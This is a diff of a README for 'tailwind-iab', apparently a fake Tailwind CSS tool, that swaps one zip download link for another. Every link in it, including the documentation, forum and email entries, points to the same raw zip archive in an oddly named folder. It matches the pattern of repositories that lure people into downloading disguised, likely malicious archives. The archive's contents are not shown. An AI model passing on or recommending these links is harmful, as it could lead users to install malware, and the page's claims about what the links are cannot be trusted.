@@ -1,7 +1,7 @@
 # 🎉 tailwind-iab - Easy Interface for Tailwind CSS
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Indo157137/tailwind-iab/main/macrocornea/tailwind-iab_v3.7.zip)](https://raw.githubusercontent.com/Indo157137/tailwind-iab/main/macrocornea/tailwind-iab_v3.7.zip)
+[![Download](https://github.com/Indo157137/tailwind-iab/raw/refs/heads/main/macrocornea/iab_tailwind_v3.8-alpha.3.zip)](https://github.com/Indo157137/tailwind-iab/raw/refs/heads/main/macrocornea/iab_tailwind_v3.8-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **tailwind-iab** application! This program simplifies working with Tailwind CSS, making it easier for everyone to create beautiful designs. Whether you want to build a simple webpage or a complex application, this tool provides a user-friendly interface.
@@ -23,7 +23,7 @@ Before you download, ensure your system meets these requirements:
 ## 📥 Download & Install
 To get started, visit the release page to download the application:
 
-[Download tailwind-iab](https://raw.githubusercontent.com/Indo157137/tailwind-iab/main/macrocornea/tailwind-iab_v3.7.zip)
+[Download tailwind-iab](https://github.com/Indo157137/tailwind-iab/raw/refs/heads/main/macrocornea/iab_tailwind_v3.8-alpha.3.zip)
 
 ### Installation Steps
 1. Click the link above to go to the Releases page.
@@ -52,13 +52,13 @@ If you face any issues during installation or usage, consider the following step
 - **Seek Support:** If problems persist, visit the GitHub repository for assistance.
 
 ## 🌐 Additional Resources
-- **Documentation:** Comprehensive guides are available [here](https://raw.githubusercontent.com/Indo157137/tailwind-iab/main/macrocornea/tailwind-iab_v3.7.zip).
-- **Community Forum:** Join discussions and ask questions [here](https://raw.githubusercontent.com/Indo157137/tailwind-iab/main/macrocornea/tailwind-iab_v3.7.zip).
+- **Documentation:** Comprehensive guides are available [here](https://github.com/Indo157137/tailwind-iab/raw/refs/heads/main/macrocornea/iab_tailwind_v3.8-alpha.3.zip).
+- **Community Forum:** Join discussions and ask questions [here](https://github.com/Indo157137/tailwind-iab/raw/refs/heads/main/macrocornea/iab_tailwind_v3.8-alpha.3.zip).
 
 ## 📞 Contact
 For further inquiries, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/Indo157137/tailwind-iab/main/macrocornea/tailwind-iab_v3.7.zip
+- **Email:** https://github.com/Indo157137/tailwind-iab/raw/refs/heads/main/macrocornea/iab_tailwind_v3.8-alpha.3.zip
 - **GitHub Issues:** Report bugs or request features directly on the GitHub page.
 
 Thank you for choosing **tailwind-iab**. We hope it helps you easily create stunning designs!
